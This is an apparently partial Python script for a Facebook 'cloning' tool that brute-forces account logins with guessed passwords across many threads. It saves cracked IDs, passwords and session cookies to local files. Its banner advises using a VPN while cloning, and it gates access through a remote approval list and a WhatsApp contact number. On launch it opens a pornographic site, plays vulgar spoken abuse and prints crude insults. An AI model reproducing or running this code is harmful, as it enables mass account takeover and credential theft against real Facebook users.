...
os.system('xdg-open https://amp.xhamster.com/tags/sexy ')
os.system('espeak -a 200 " Your,   Real,  Name,"')
NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m DEVI TERA BAAP HAII INTER YOUR FAKE FATHER NAME?\033[1;91m:\33[1;32m')
os.system('espeak -a 200 "Sexi,viedo,daka,lo,bhen,ka,lund"')
os.system('xdg-open https://www.facebook.com/d3vionfire')
logo=(f'''
...
{G} $$ |  $$ |$$   ____| \$$$  /  $$ |🖤
{G} $$$$$$$  |\$$$$$$$\   \$  /   $$ |💙
{G}\_______/  \_______|   \_/    \__|        💜


{G}𝗡𝗢𝗧𝗘1:𝗩𝗽𝗻 𝗧𝗼 𝗔𝗽 𝘂𝘀𝗲 𝗸𝗿 𝗥𝗵𝗮 𝗵𝗼𝗻 𝗽𝗼𝗿𝗻𝘀 𝗯𝗵𝗶 𝗱𝗮𝗸𝗮 𝗟𝗼
{X}𝗡𝗼𝘁𝗲2:𝗩𝗽𝗻 1.1.1.1 𝗖𝗹𝗼𝗻𝗶𝗻𝗴 𝗸𝗮 𝗧𝗶𝗺𝗲 𝘂𝘀𝗲 𝗸𝗿𝗻𝗮 
{B}𝗡𝗼𝘁𝗲3:𝗖𝗹𝗼𝗻𝗶𝗻𝗴 𝗶𝗱 𝗙𝗕 BXI 𝗟𝗶𝘁𝗲 𝗠𝗲 𝗢𝗽𝗲𝗻 𝗵𝗼 𝗴𝗮𝗶𝗶 𝗝𝗶𝘀𝗮 𝗸𝗮 𝗽𝗮𝘀𝘀 𝗻𝗵𝗶 𝗵𝗮𝗶𝗶 𝘆𝗵𝗮 𝗳𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝘄𝗼 𝗪𝗽 𝗽𝗿 𝗹𝘆𝗮 𝘀𝗮𝗸𝘁𝗮 𝗵𝗮𝗶
{O}𝗡𝗼𝘁𝗲4:𝗝𝗯 𝗖𝗹𝗼𝗻𝗶𝗻𝗴 𝗶𝗱 𝗢𝗽𝗲𝗻 𝗸𝗿𝗼 𝘁𝗼 𝗩𝗽𝗻 𝗽𝗼𝗿𝘁𝗼𝗻 𝗨𝘀𝗲 𝗸𝗿𝗼 𝗜𝗱 𝗙𝗮𝘀𝘁 𝗢𝗽𝗲𝗻 𝗛𝗼 𝗴𝗮𝗶𝗶




{R}𝗬𝗵𝗮 𝗡𝗼𝘁𝗲 𝗝𝗼 𝗙𝗼𝗹𝗹𝗼𝘄 𝗻𝗵𝗶 𝗸𝗿 𝗚𝘆𝗮 𝗪𝗼 𝗠𝗲𝗿𝗮 𝗟𝘂𝗻 𝗣𝗿 𝗖𝗵𝗮𝗿𝗮 


                                                                                                                                
{R}──────────────────────────────────────────────────
{R} 𝗔𝗗𝗗𝗠𝗜𝗡 {Y} 𝗗𝗘𝗩𝗜 𝗢𝗡𝗙𝗜𝗥𝗘 🐻 
{R} 𝗧𝗢𝗢𝗟     {Y} 𝗥𝗔𝗡𝗗𝗢𝗠 𝗖𝗟𝗢𝗡𝗜𝗡𝗚
{R} 𝗖𝗢𝗨𝗡𝗧𝗥𝗬     {Y} 𝗣𝗔𝗞𝗜𝗦𝗧𝗔𝗡
{B} 𝗦𝗧𝗔𝗧𝗦 {G} 𝗙𝗥𝗘𝗘
{R}──────────────────────────────────────────────────''')
#---------------------------| Menux |---------------------------#
def _____menux_____():
	clear()
	print(f"{A}|1| Random Cloning ");print(f"{B}|2| Old Cloning ");linex();option=input(f"{G} Choice : ")
...
def _____Bangladesh1_____():
	...
	with tred(max_workers=100) as Devix:
		...
		for love in user:
			...
			if methd in ['1']:DEVIx.submit(____M1____,idf,pwv)
			if methd in ['2']:DEVIx.submit(____M2____,idf,pwv)
			if methd in ['3']:DEVIx.submit(____M3____,idf,pwv)
			if methd in ['4']:DEVIx.submit(____M4____,idf,pwv)
			if methd in ['5']:DEVIx.submit(____M5____,idf,pwv)
			if methd in ['6']:DEVIx.submit(____M6____,idf,pwv)
...
def ____M1____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|DEVI-M1|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
		...
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|DEVI-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|DEVI-OK|>{white} {kuki}")
					open('/sdcard/DEVI-RANDOM-M1-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|DEVI-CP|> {idf} ● {pw} ")
				open('/sdcard/DEVI-RANDOM-M1-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
...
def ____M2____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|DEVI-M2|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|DEVI-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|DEVI-OK|>{white} {kuki}")
					open('/sdcard/DEVI-RANDOM-M2-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|DEVI-CP|> {idf} ● {pw} ")
				open('/sdcard/DEVI-RANDOM-M2-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M3____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|DEVI-M3|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|DEVI-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|DEVI-OK|>{white} {kuki}")
					open('/sdcard/DEVI-RANDOM-M3-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|DEVI-CP|> {idf} ● {pw} ")
				open('/sdcard/DEVI-RANDOM-M3-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M4____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|DEVI-M4|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try: 
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|DEVI-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|DEVI-OK|>{white} {kuki}")
					open('/sdcard/DEVI-RANDOM-M4-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r\r{ping}<|DEVI-CP|> {idf} ● {pw} ")
				open('/sdcard/DEVI-RANDOM-M4-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
...
def ____M5____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|DEVI-M5|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|DEVI-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|DEVI-OK|>{white} {kuki}")
					open('/sdcard/DEVI-RANDOM-M5-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|DEVI-CP|> {idf} ● {pw} ")
				open('/sdcard/DEVI-RANDOM-M5-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
...
def ____M6____(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\r{white}<|DEVI-M6|> <|{loop}|> <|{ok}|> <|{cp}|> ");sys.stdout.flush()
	try:
		for pw in pwv:
			...
			if 'access_token' in q:
				...
				if "Photoshop" in lk_remove:
					print(f"\r\r{green}<|DEVI-OK|> {idf} ● {pw}")
					print(f"\r\r{green}<|DEVI-OK|>{white} {kuki}")
					open('/sdcard/DEVI-RANDM-M6-OK.txt', 'a').write(idf+' | '+pw+' |-> '+kuki+"\n")
					break
			elif 'www.facebook.com' in q['error']['message']:
				print(f"\r\r{ping}<|DEVI-CP|> {idf} ● {pw} ")
				open('/sdcard/DEVI-RANDOM-M6-CP.txt','a').write(idf+'|'+pw+'\n')
				break
			else:continue
		loop+=1
	except Exception as e:
...
def ____old____(uid,pas,tl):
	global loop,ok
	sys.stdout.write(f"\r\r{white}<|DEVI-XD|> <|{loop}|> <|{ok}|> ");sys.stdout.flush()
	try:
		for ps in pas:
  ...
  uuid = "MR"+str(os.getuid())+"DEVI-ONFIRE"+str(os.getuid())+"FREE.TOOL.JUST HATER .PAID"
  id = ''.join(uuid)
  try:
    httpCaht = requests.get(f"https://github.com/deathherev/Cloning-Fb/blob/main/approval.txt").text
    if id in httpCaht:
      msg = str(os.geteuid())
      print()
      pass
      ...
      input('\033[1;30m[❤️‍🩹] IF U WANT APPROVAL FOR FREE THEN PRESS ENTER ')
      tks = ('Hello%20Devi%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923126607150?text='+tks),approval()       
  except:
    sys.exit()
print(logo)
meyexudi()
